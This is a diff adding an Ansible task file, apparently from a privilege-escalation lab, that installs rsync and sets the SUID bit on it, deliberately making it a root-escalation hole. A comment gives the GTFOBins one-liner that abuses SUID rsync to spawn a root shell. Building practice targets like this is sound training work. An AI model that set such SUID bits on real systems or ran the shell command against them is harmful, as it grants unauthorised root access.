@@ -1,0 +1,13 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/rsync/#suid
+# Exploit: rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
+- name: (privesc/suid_rsync) Install rsync
+  ansible.builtin.apt:
+    name: rsync
+    state: present
+
+- name: (privesc/suid_rsync) Set SUID bit on /usr/bin/rsync
+  ansible.builtin.file:
+    path: /usr/bin/rsync
+    owner: root
+    mode: "4755"
